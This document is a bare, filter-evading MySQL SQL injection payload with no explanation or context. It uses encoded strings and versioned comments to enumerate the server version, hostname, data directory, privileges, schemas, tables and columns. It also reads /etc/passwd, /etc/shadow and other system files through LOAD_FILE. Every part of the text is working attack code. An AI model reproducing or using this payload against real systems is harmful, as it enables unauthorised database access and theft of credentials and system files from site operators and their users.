+/*!50000COnCaT*/(0x3c68313e5f59303030215f3c2f68313e,0x3c703e56657273696f6e3a203c2f703e,/*!50000@@VerSion*/,0x3c62723e,0x3c703e486f73746e616d653a203c2f703e,/*!50000@@hOstName*/,0x3c62723e,0x3c62723e,0x3c613e4469726563746f72696f20696e7374616c63696f6e2062617365206465206461746f733a203c2f613e,/*!50000@@DatAdir*/,0x3c62723e,0x3c62723e,0x3c613e50726976696c6567696f733a203c2f613e,0x3c62723e,(/*!50000SelecT*/%20/*!50000grouP_conCat(GRANTEE,0x202d3e20,IS_GRANTABLE)*/+/*!50000fRom/**8**/*/+/*!50000iNfoRmAtiOn_sChEmA/**_**/.USEr_PRiVIleGES*/),0x3c62723e,0x3c62723e,0b0011110001100001001111100101010101110011011101010110000101110010011010010110111101110011001000000110001101101111011011100010000001110000011001010111001001101101011010010111001101101111011100110010000001110010011011110110111101110100001110100010000000111100001011110110000100111110,0x3c62723e,(/*!50000SelecT*/%20/*!50000IfNuLL(/*!50000grouP_conCat(grantee,privilege_type,is_grantable,0x3c62723e),%27NO%20CUENTAS%20CON%20PERMISOS%27)*/+/*!50000fRom/**8**/*/+/*!50000iNfoRmAtiOn_sChEmA/**_**/.USEr_PRiVIleGES*/%20/*!50000WHERe%20/**8**/*/+/*!50000privilege_type/**8**/*/%20=%20%27SUPER%27),0x3c62723e,0x3c62723e,0b001111000110000100111110010011100111010101101101001011100010000001100010011000010111001101100101001000000110010001100101001000000110010001100001011101000110111101110011001110100010000000111100001011110110000100111110,0x3c62723e,(/*!50000SelecT*/%20/*!50000CoUnT(/*!50000COnCaT*/(/*!50000schema_name/**8**/*/)/**8**/)+/*!50000fRom/**8**/*/+/*!50000iNfoRmAtiOn_sChEmA/**_**/.ScHeMaTa*/)/**8**/,0x3c62723e,0x3c62723e,0b0011110001100001001111100110001001100001011100110110010101110011001000000110010001100101001000000110010001100001011101000110111101110011001110100010000000111100001011110110000100111110,0x3c62723e,(/*!50000SelecT*/%20/*!50000grouP_conCat(/*!50000schema_name/**8**/*/,0x3c62723e)/**8**/+/*!50000fRom/**8**/*/+/*!50000iNfoRmAtiOn_sChEmA/**_**/.ScHeMaTa*/),0x3c62723e,0b00111100011000010011111001001110011101010110110100101110001000000110001001100001011100110110010100100000011001000110010100100000011101000110000101100010011011000110000101110011001110100010000000111100001011110110000100111110,0x3c62723e,(/*!50000SelecT*/%20/*!50000CoUnT(/*!50000COnCaT*/(/*!50000table_name/**8**/*/))+/*!50000fRom/**8**/*/+/*!50000iNfoRmAtiOn_sChEmA/**_**/.tabLes*/+/*!50000wHerE*/+/*!50000table_schema*/=/*!50000databAse/**8**/()*//**/),0x3c62723e,(/*!50000SelecT*/(@x)/*!50000fRom/**8**/*/(/*!50000SelecT*/(@x:=0x00),(/*!50000SelecT*/(0)/*!50000fRom/**8**/*/(/*!50000iNfoRmAtiOn_sChEmA/**_**/.cOlumNs*/)/*!50000where/**8**/*/(/*!50000table_schema*/=/*!50000databAse/**8**/()*//**/)/*!50000and*/(0x00)in(@x:=/*!50000COnCaT*/+(@x,0x3c62723e,/*!50000tablE_name*/,0x203a3a20,/*!50000columN_name*/))))x),0x3c62723e,0x3c62723e,0b001111000110000100111110010011000110111101100011011000010110110000100000011001100110100101101100011001010010000001110010011001010110000101100100001110100010000000111100001011110110000100111110,0x3c62723e,0x3c62723e,0b0011110001100001001111100010111101100101011101000110001100101111011100000110000101110011011100110111011101100100001110100010000000111100001011110110000100111110,0x3c62723e,(/*!50000SelecT*/%20+/*!50000iFnUll*/(/*!50000COnCaT*/(/*!50000loaD_fiLe*/(0x2f6574632f706173737764)),'NO CUENTAS CON PERMISOS')),0x3c62723e,0x3c62723e,0b001011110110010101110100011000110010111101110011011010000110000101100100011011110111011100111010,0x3c62723e,(/*!50000SelecT*/%20+/*!50000iFnUll*/(/*!50000COnCaT*/(/*!50000loaD_fiLe*/(0x2f6574632f736861646f77)),'NO CUENTAS CON PERMISOS')),0x3c62723e,0x3c62723e,0b0010111101100101011101000110001100101111011001110111001001101111011101010111000000111010,0x3c62723e,(/*!50000SelecT*/%20+/*!50000iFnUll*/(/*!50000COnCaT*/(/*!50000loaD_fiLe*/(0x2f6574632f67726f7570)),'NO CUENTAS CON PERMISOS')),0x3c62723e,0x3c62723e,0b0010111101100101011101000110001100101111011010000110111101110011011101000111001100111010,0x3c62723e,(/*!50000SelecT*/%20+/*!50000iFnUll*/(/*!50000COnCaT*/(/*!50000loaD_fiLe*/(0x2f6574632f686f737473)),'NO CUENTAS CON PERMISOS')),0x3c62723e,0x3c62723e,0b00101111011001010111010001100011001011110110111101110011001011010111001001100101011011000110010101100001011100110110010100111010,0x3c62723e,(/*!50000SelecT*/%20+/*!50000iFnUll*/(/*!50000COnCaT*/(/*!50000loaD_fiLe*/(0x2f6574632f6f732d72656c65617365)),'NO CUENTAS CON PERMISOS')))
+
